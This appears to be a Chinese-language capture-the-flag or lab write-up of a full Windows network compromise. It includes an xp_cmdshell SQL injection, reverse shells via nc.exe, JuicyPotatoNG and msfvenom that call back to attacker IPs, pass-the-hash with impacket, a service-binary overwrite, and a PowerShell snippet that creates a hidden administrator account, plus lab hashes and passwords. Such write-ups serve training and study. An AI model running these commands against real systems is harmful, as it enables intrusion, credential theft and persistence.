## Introduce
![image](_assets/B1z8TQ5yWl.png)
![image](_assets/rJeN6Q5Jbx.png)
![image](_assets/Hyv5T75yZe.png)

## Nmap
### 外網
* `192.168.x.120`

  ![image](_assets/SybMR75ybx.png)

  ![image](_assets/BJXgkE51-x.png)

* `192.168.x.121`

  ![image](_assets/SyHuAX5JZg.png)

  ![image](_assets/ry9CIr9yWe.png)

* `192.168.x.122`

  ![image](_assets/rkIn0Q91Ze.png)

## 網頁
* `192.168.x.120`
    1. Site map
    ![image](_assets/HyyUwBc1bg.png)

    2. Powered by
    ![image](_assets/r1RwwHq1Zx.png)
    
    3. about
    ![image](_assets/Sy6J_ScJZg.png)

    4. post 
    ![image](_assets/BkgWOBc1bl.png)
    
    5. dirsearch
    ![image](_assets/SJdfur9JWl.png)
    
    6. assets
    `using WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)`
    ![image](_assets/HJbUOScyWg.png)

    7. static
    ![image](_assets/BJY9OS9JZx.png)


* `192.168.x.121`
    1. Login page
    ![image](_assets/H12Z_Iqybx.png)

    2. Powered by
    ![image](_assets/Hyifd89yWl.png)

## SQL Injection反連
1. 正常狀況下
![image](_assets/rkiCd85ybe.png)
2. SQL錯誤時
(試過用auth bypass的wordlist繞過密碼欄位，但都沒什麼反應)
![image](_assets/SklgYI9yZx.png)
3. SQL執行指令
`';EXECUTE xp_cmdshell '<reverse shell>';--`
需要用最後面的`--`讓網頁的sql查詢正常結束
    1. 使用powershell Base64做反連會沒辦法顯示錯誤訊息
    2. 使用nc.exe可以正常顯示
![image](_assets/Sy4n_UqJbg.png)
![image](_assets/rkbJqUcJ-e.png)

## WEB02提權
* winpeas
    1. hash
    使用密碼爆破及evilRM失敗
    ![image](_assets/rJ2whPn1-x.png)
    ![image](_assets/B1yV9_h1-g.png)
    ![image](_assets/Hk-RiuhJ-l.png)

    2. 用戶權限
    `https://github.com/antonioCoco/JuicyPotatoNG/releases`
    `JuicyPotatoNG.exe -t * -p "nc.exe" -a "192.168.45.177 9003 -e powershell"`
    ![image](_assets/ryVGc_hkbx.png)
    ![image](_assets/HksR0O2k-e.png)
    ![image](_assets/rkYk1tn1-l.png)
    ![image](_assets/rkCukt2y-e.png)

## mimikatz
`impacket-wmiexec -hashes :b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.123.121`
![image](_assets/r14Fxi3yWl.png)
![image](_assets/rJjPxsnkbe.png)

## ligolo-ng
![image](_assets/BJT0Dnn1-e.png)
![image](_assets/HyQbu22kWe.png)

## Nmap(內網)
![image](_assets/HyFBrAhkbx.png)

1. `172.16.x.10`
![image](_assets/HJenl6hk-l.png)

2. `172.16.x.11`
![image](_assets/Skqtzp2kWx.png)

3. `172.16.x.12`
![image](_assets/BJj5zpnJbg.png)

4. `172.16.x.13`
![image](_assets/Hktszp2JZx.png)

5. `172.16.x.14`
![image](_assets/Skqnf621bg.png)

6. `172.16.x.82`
![image](_assets/B12aMa3kWg.png)

7. `172.16.x.83`
![image](_assets/Skb17pn1be.png)

## 連接內網
1. `joe & Flowers1`
`evil-winrm -i 172.16.249.11 -u joe -p Flowers1`
嘗試使用smb跟winrm連接，兩項嘗試均失敗（但用單位的電腦掃得出來）
![image](_assets/ByaU_6hk-g.png)
![image](_assets/Sklcvua31Zl.png)
![image](_assets/HJxhD_yeZl.png)

2. `joe & 08d7a47a6f9f66b97b1bae4178747494`
`impacket-wmiexec -hashes :08d7a47a6f9f66b97b1bae4178747494 joe@172.16.123.11`
使用hash連接目標內網，其中172.16.x.11可以連接
![image](_assets/BJzvZ161We.png)

## FILES02提權
![image](_assets/Bkph1lTJZe.png)

## FILES02可疑檔案
`C:\Users\joe\Documents\fileMonitorBackup.log`
查看文件內容後，發現4組帳號+Hash的字串，成功解密出一組密碼
![image](_assets/ryL-SiaJZe.png)
![image](_assets/B1xV8spkbe.png)
![image](_assets/SyITUja1-e.png)
![image](_assets/BJaxDo61-l.png)

## CLIENT02
`evil-winrm -i 172.16.249.83 -u wario -p Mushroom!`
![image](_assets/HymUOuygWx.png)
* auditTracker.exe
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.209 LPORT=9962 -f exe -o reverse.exe`
利用auditTracker.exe可以被任意使用者複寫的特點將Payload覆蓋過去，計畫是將電腦重新開機來讓auditTracker.exe可以被重新自動載入，當前使用者也有相關權限，但還是沒辦法順利重新開機，所以改為用`sc.exe`啟動服務
![image](_assets/B1Lt-F1eZe.png)
![image](_assets/H1-WVFyeZg.png)
![image](_assets/S1o07Kkg-g.png)
![image](_assets/SkKVBKkxWg.png)
![image](_assets/SktSBtkebx.png)
![image](_assets/rkwf5qJlWe.png)
![image](_assets/B1_XcqJeWe.png)

## CLIENT02 RDP
```powershell
# Enable RDP so we can access the system afterwards
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -name "fDenyTSConnections" -value 0

# Set up user
$username = "josh"
$password = ConvertTo-SecureString "Password123$" -AsPlainText -Force
New-LocalUser -Name "$username" -Password $password -FullName "$username"

Add-LocalGroupMember -Group "Administrators" -Member "$username"
```
`xfreerdp3 /u:josh /p:Password123$ /v:172.16.249.83 /dynamic-resolution`
![image](_assets/Hyddo9Jg-e.png)

## CLIENT02 Mimikatz
![image](_assets/SJjKaqyg-e.png)
![image](_assets/HkYcT9ylWe.png)
![image](_assets/BkF_091lbx.png)
![image](_assets/SJTGwCxlZx.png)
![image](_assets/rk-YDAllWg.png)

## nxc密碼噴灑
* smb

  ![image](_assets/SkVyvRxxWl.png)

  ![image](_assets/ByDGnAeeWg.png)

* winrm

  ![image](_assets/HktOu0xg-l.png)

## CLIENT01 RDP
`impacket-psexec 'medtech.com/yoshi:Mushroom!'@172.16.172.82`

## DEV04
* 連接
`xfreerdp3 /u:yoshi /p:Mushroom! /v:172.16.172.12 /dynamic-resolution`
DEV04有一個3389port，在網上搜尋得知是RDP用的
![image](_assets/SyePUkbgZl.png)
![image](_assets/H1nsDy-ebe.png)

* 提權
經過winPeas之後，得出的結果只有這一項`backup.exe`不是常見的檔案，但沒發現有任何服務會啟動他，所以直接替換檔案並在本地端開啟nc，看是否為自動排程的一部分。
結果確實是自動排程的一部分，反連後的身分為`nt authority\system`
![image](_assets/ByuIG_Qgbe.png)

* Mimikatz
`xfreerdp3 /u:leon /p:"rabbit:)" /v:172.16.224.12 /dynamic-resolution`
![image](_assets/ByqOHO7gWe.png)
![image](_assets/SJCmI_Xl-x.png)
![image](_assets/S1T6w_Xebx.png)
![image](_assets/HkVQud7lbx.png)

## DC01
* 連接
用evil-winrm連接後，先打開RDP功能，並在admin桌面發現`credentials.txt`
`evil-winrm -i 172.16.224.10 -u leon -p "rabbit:)"`
`xfreerdp3 /u:leon /p:"rabbit:)" /v:172.16.224.10 /dynamic-resolution`
![image](_assets/SyQWqOXeZg.png)
![image](_assets/BkoNcOQl-e.png)

* Psexec
    1. 172.16.x.13
    ![image](_assets/SkpHT_Qx-l.png)

## 剩餘主機
1. `192.168.x.120`
![image](_assets/BJAkSKmx-e.png)
![image](_assets/ryg0HFQxZl.png)
![image](_assets/HyTA6KXgWx.png)

2. `192.168.x.122`
![image](_assets/S1M0ycQeZl.png)
![image](_assets/SJ6Vxq7e-g.png)
![image](_assets/r1nSeqQeZx.png)
![image](_assets/rkr9lcmxWx.png)
![image](_assets/Bk3pg9Xxbl.png)
![image](_assets/HJ8N-c7xWx.png)
![image](_assets/ByIxQ5mlWe.png)
![image](_assets/ByPmwqmlZe.png)

3. `172.16.x.14`